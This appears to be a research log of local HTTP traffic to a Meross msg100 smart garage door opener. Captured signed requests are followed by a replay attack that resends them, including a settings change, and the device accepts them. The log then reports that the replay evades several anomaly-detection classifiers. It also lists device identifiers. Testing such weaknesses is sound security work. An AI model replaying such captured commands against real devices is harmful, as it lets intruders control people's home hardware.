{"devName":"msg100","devSoftWare":"4.2.6","devHardWare":"4.0.0","ip":"10.13.0.32","port":80,"mac":"48:e1:e9:ab:ec:1b","uuid":"2210197269145761070248e1e9abec1b","deviceType":"msg100","subType":"us"}
POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 310
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"4cb22a67220aa8f3d3e1d0484420c370","method":"GET","namespace":"Appliance.System.All","payloadVersion":1,"sign":"c63144edc3fa04acbbfa0f72bd825536","timestamp":1693945984,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"4cb22a67220aa8f3d3e1d0484420c370","namespace":"Appliance.System.All","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945988,"timestampMs":688,"sign":"56f9cb7d12732095a3ac614ead45af96"},"payload":{"all":{"system":{"hardware":{"type":"msg100","subType":"us","version":"4.0.0","chipType":"MT7686","uuid":"2210197269145761070248e1e9abec1b","macAddress":"48:e1:e9:ab:ec:1b"},"firmware":{"version":"4.2.6","homekitVersion":"2.0.1","compileTime":"Oct 24 2022 10:28:41","encrypt":1,"wifiMac":"28:e3:47:c2:d9:cc","innerIp":"10.13.0.32","server":"mqtt-us-2.meross.com","port":443,"userId":3094003},"time":{"timestamp":1693945988,"timezone":"Europe/Rome","timeRule":[[1679792400,7200,1],[1698541200,3600,0],[1711846800,7200,1],[1729990800,3600,0],[1743296400,7200,1],[1761440400,3600,0],[1774746000,7200,1],[1792890000,3600,0],[1806195600,7200,1],[1824944400,3600,0],[1837645200,7200,1],[1856394000,3600,0],[1869094800,7200,1],[1887843600,3600,0],[1901149200,7200,1],[1919293200,3600,0],[1932598800,7200,1],[1950742800,3600,0],[1964048400,7200,1],[1982797200,3600,0]]},"online":{"status":1,"bindId":"U8dHQ2wouexxfAA0","who":1}},"digest":{"togglex":[{"channel":0,"onoff":0,"lmTime":0}],"triggerx":[{"channel":0,"id":"1111111111111111","count":1}],"timerx":[],"garageDoor":[{"channel":0,"open":1,"lmTime":
{"devName":"msg100","devSoftWare":"4.2.6","devHardWare":"4.0.0","ip":"10.13.0.32","port":80,"mac":"48:e1:e9:ab:ec:1b","uuid":"2210197269145761070248e1e9abec1b","deviceType":"msg100","subType":"us"}
POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 310
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"4cb22a67220aa8f3d3e1d0484420c370","method":"GET","namespace":"Appliance.System.All","payloadVersion":1,"sign":"c63144edc3fa04acbbfa0f72bd825536","timestamp":1693945984,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
{"devName":"msg100","devSoftWare":"4.2.6","devHardWare":"4.0.0","ip":"10.13.0.32","port":80,"mac":"48:e1:e9:ab:ec:1b","uuid":"2210197269145761070248e1e9abec1b","deviceType":"msg100","subType":"us"}
POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 313
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"266d75e26673a637753f4eb24b88661c","method":"GET","namespace":"Appliance.System.Online","payloadVersion":1,"sign":"c20b07c55db9c64b0c540e19c3361fbc","timestamp":1693945986,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"266d75e26673a637753f4eb24b88661c","namespace":"Appliance.System.Online","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945989,"timestampMs":421,"sign":"da2ca76d7bfa11d54015c06365e6c9c5"},"payload":{"online":{"status":1,"bindId":"U8dHQ2wouexxfAA0","who":1}}}

{"devName":"msg100","devSoftWare":"4.2.6","devHardWare":"4.0.0","ip":"10.13.0.32","port":80,"mac":"48:e1:e9:ab:ec:1b","uuid":"2210197269145761070248e1e9abec1b","deviceType":"msg100","subType":"us"}
POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 317
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"7ddd58a7fd5a47c44427dc19080e793e","method":"GET","namespace":"Appliance.GarageDoor.Config","payloadVersion":1,"sign":"a356ff1b618a2506b5eafbfe6aa547ab","timestamp":1693945991,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 314
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"47d4c90da2aded79f202001eb61cd71c","method":"GET","namespace":"Appliance.System.DNDMode","payloadVersion":1,"sign":"fe5f2cd4b2429fcbd57a53054b5d9909","timestamp":1693945991,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 313
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"fac68d18f38a5e9072095983ea79ff3c","method":"GET","namespace":"Appliance.Digest.TimerX","payloadVersion":1,"sign":"01aeedc3187cd8b81f6c50120ba78b78","timestamp":1693945991,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"7ddd58a7fd5a47c44427dc19080e793e","namespace":"Appliance.GarageDoor.Config","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945993,"timestampMs":154,"sign":"70d836c0d62b6cbf2a28556e33f063e7"},"payload":{"config":{"signalDuration":2000,"buzzerEnable":0,"doorOpenDuration":5000,"doorCloseDuration":5000}}}

POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 317
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"fc75f7840a68d68db384b41bf25ee4de","method":"GET","namespace":"Appliance.GarageDoor.Config","payloadVersion":1,"sign":"e3e66fb99cde2e3cc9071729761455c2","timestamp":1693945991,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"47d4c90da2aded79f202001eb61cd71c","namespace":"Appliance.System.DNDMode","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945993,"timestampMs":161,"sign":"43d51096f8155c288dc3498fa3d26a07"},"payload":{"DNDMode":{"mode":1}}}

HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"fac68d18f38a5e9072095983ea79ff3c","namespace":"Appliance.Digest.TimerX","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945993,"timestampMs":181,"sign":"ef9e0071c6169291e185b6ea8bb2ef65"},"payload":{"digest":[]}}

HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"fc75f7840a68d68db384b41bf25ee4de","namespace":"Appliance.GarageDoor.Config","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945993,"timestampMs":213,"sign":"8c245bcac8ad8f7a440bfd5195fd259a"},"payload":{"config":{"signalDuration":2000,"buzzerEnable":0,"doorOpenDuration":5000,"doorCloseDuration":5000}}}

POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 314
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"85e1aece3e80362894067b2eb2939a6e","method":"GET","namespace":"Appliance.System.Runtime","payloadVersion":1,"sign":"0dd19512c0d10112758f1f0d2deb7761","timestamp":1693945991,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 315
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"0c276889ac8ebacc6f9ed0c08a13c881","method":"GET","namespace":"Appliance.Digest.TriggerX","payloadVersion":1,"sign":"1d16cea77439af75eba31c90c2fc0b30","timestamp":1693945991,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"85e1aece3e80362894067b2eb2939a6e","namespace":"Appliance.System.Runtime","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945994,"timestampMs":326,"sign":"59455fa02f0bd5482a7cbfe2b59ddfd9"},"payload":{"runtime":{"signal":100}}}

HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"0c276889ac8ebacc6f9ed0c08a13c881","namespace":"Appliance.Digest.TriggerX","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945994,"timestampMs":334,"sign":"2de651dbff878736b3342af05a32245d"},"payload":{"digest":[{"channel":0,"id":"1111111111111111","count":1}]}}

POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 334
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"ccac54b31635076be1722391955f7865","method":"SET","namespace":"Appliance.System.DNDMode","payloadVersion":1,"sign":"33166222786d965fc42f5491fec6b0ab","timestamp":1693945996,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{"DNDMode":{"mode":0}}}
HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"ccac54b31635076be1722391955f7865","namespace":"Appliance.System.DNDMode","triggerSrc":"AndroidLocal","method":"SETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693945998,"timestampMs":949,"sign":"b7a642858c0fc2e455df07eda192ae28"},"payload":{}}

START REPLAY ATTACK
#######################################################################################
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 334
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"ccac54b31635076be1722391955f7865","method":"SET","namespace":"Appliance.System.DNDMode","payloadVersion":1,"sign":"33166222786d965fc42f5491fec6b0ab","timestamp":1693945996,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{"DNDMode":{"mode":0}}}
****************************************************************
received payload=HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"ccac54b31635076be1722391955f7865","namespace":"Appliance.System.DNDMode","triggerSrc":"AndroidLocal","method":"SETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693946105,"timestampMs":431,"sign":"b8963274be970e1eda2699a06fd46807"},"payload":{}}

****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 314
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"85e1aece3e80362894067b2eb2939a6e","method":"GET","namespace":"Appliance.System.Runtime","payloadVersion":1,"sign":"0dd19512c0d10112758f1f0d2deb7761","timestamp":1693945991,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"85e1aece3e80362894067b2eb2939a6e","namespace":"Appliance.System.Runtime","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693946105,"timestampMs":497,"sign":"7869a4dc8b8817a685792adb53ebc4a8"},"payload":{"runtime":{"signal":100}}}

****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 315
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"0c276889ac8ebacc6f9ed0c08a13c881","method":"GET","namespace":"Appliance.Digest.TriggerX","payloadVersion":1,"sign":"1d16cea77439af75eba31c90c2fc0b30","timestamp":1693945991,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=
****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 317
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"fc75f7840a68d68db384b41bf25ee4de","method":"GET","namespace":"Appliance.GarageDoor.Config","payloadVersion":1,"sign":"e3e66fb99cde2e3cc9071729761455c2","timestamp":1693945991,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"fc75f7840a68d68db384b41bf25ee4de","namespace":"Appliance.GarageDoor.Config","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693946105,"timestampMs":535,"sign":"77be21bc27f6b8ee5aea81991668d595"},"payload":{"config":{"signalDuration":2000,"buzzerEnable":0,"doorOpenDuration":5000,"doorCloseDuration":5000}}}

****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 317
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"7ddd58a7fd5a47c44427dc19080e793e","method":"GET","namespace":"Appliance.GarageDoor.Config","payloadVersion":1,"sign":"a356ff1b618a2506b5eafbfe6aa547ab","timestamp":1693945991,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"7ddd58a7fd5a47c44427dc19080e793e","namespace":"Appliance.GarageDoor.Config","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693946105,"timestampMs":579,"sign":"c0b2392d89eeb78d4e98cd7d479507ca"},"payload":{"config":{"signalDuration":2000,"buzzerEnable":0,"doorOpenDuration":5000,"doorCloseDuration":5000}}}

****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 314
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"47d4c90da2aded79f202001eb61cd71c","method":"GET","namespace":"Appliance.System.DNDMode","payloadVersion":1,"sign":"fe5f2cd4b2429fcbd57a53054b5d9909","timestamp":1693945991,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=
****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 313
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"fac68d18f38a5e9072095983ea79ff3c","method":"GET","namespace":"Appliance.Digest.TimerX","payloadVersion":1,"sign":"01aeedc3187cd8b81f6c50120ba78b78","timestamp":1693945991,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=
****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 313
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"266d75e26673a637753f4eb24b88661c","method":"GET","namespace":"Appliance.System.Online","payloadVersion":1,"sign":"c20b07c55db9c64b0c540e19c3361fbc","timestamp":1693945986,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"266d75e26673a637753f4eb24b88661c","namespace":"Appliance.System.Online","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693946105,"timestampMs":593,"sign":"3daa6363038a918d6a9edd3807e20a92"},"payload":{"online":{"status":1,"bindId":"U8dHQ2wouexxfAA0","who":1}}}

****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 310
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"4cb22a67220aa8f3d3e1d0484420c370","method":"GET","namespace":"Appliance.System.All","payloadVersion":1,"sign":"c63144edc3fa04acbbfa0f72bd825536","timestamp":1693945984,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"4cb22a67220aa8f3d3e1d0484420c370","namespace":"Appliance.System.All","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693946105,"timestampMs":615,"sign":"3bd752aa3a4d2cdacddcb55aefb01314"},"payload":{"all":{"system":{"hardware":{"type":"msg100","subType":"us","version":"4.0.0","chipType":"MT7686","uuid":"2210197269145761070248e1e9abec1b","macAddr
****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 310
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"4cb22a67220aa8f3d3e1d0484420c370","method":"GET","namespace":"Appliance.System.All","payloadVersion":1,"sign":"c63144edc3fa04acbbfa0f72bd825536","timestamp":1693945984,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=
****************************************************************
REPLAY ATTACK SUCCESSFUL WITH CLF=OneClassSVM(gamma='auto', nu=0.001)
REPLAY ATTACK SUCCESSFUL WITH CLF=IsolationForest(contamination=0.01)
REPLAY ATTACK SUCCESSFUL WITH CLF=EllipticEnvelope(contamination=0.01)
REPLAY ATTACK SUCCESSFUL WITH CLF=LocalOutlierFactor(contamination=0.01, novelty=True)
REPLAY ATTACK SUCCESSFUL WITH CLF=CustomClassifier()
END REPLAY ATTACK
